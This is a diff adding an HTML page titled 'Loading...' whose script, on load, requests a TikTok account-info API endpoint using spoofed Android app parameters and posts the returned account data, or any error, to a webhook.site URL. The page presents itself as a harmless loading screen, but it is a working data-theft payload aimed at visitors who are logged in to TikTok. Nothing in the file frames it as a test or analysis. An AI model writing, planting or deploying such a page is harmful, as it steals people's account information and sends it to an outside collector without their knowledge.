@@ -1,1 +1,26 @@
-
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+<script>
+  fetch("https://api.tiktokv.com/passport/account/info/v2/?aid=1233&screen_height_dp=914&screen_width_dp=411&device_platform=android&os=android&_rticket=1751039699438&cdid=95914854-288b-42c0-9700-0bcccb2c8104&channel=googleplay&app_name=musical_ly&version_code=2024004030&version_name=40.4.3&manifest_version_code=2024004030&update_version_code=2024004030&ab_version=40.4.3&resolution=1080*2194&dpi=420&device_type=SM-A325F&device_brand=samsung&language=en&os_api=33&os_version=13&ac=mobile&is_pad=0&current_region=JO&app_type=normal&sys_region=GB&last_install_time=1743548773&mcc_mnc=41601&timezone_name=Asia%2FAmman&carrier_region_v2=416&residence=JO&app_language=en&carrier_region=JO&ac2=lte&uoo=0&op_region=JO&timezone_offset=10800&build_number=40.4.3&host_abi=arm64-v8a&locale=en-GB&region=")
+    .then(res => res.json())
+    .then(data => {
+      fetch("https://webhook.site/58151ca8-61ed-4159-9ead-1a98c1b9a747", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    })
+    .catch(err => {
+      fetch("https://webhook.site/58151ca8-61ed-4159-9ead-1a98c1b9a747", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ error: err.toString() })
+      });
+    });
+</script>
+</body>
+</html>
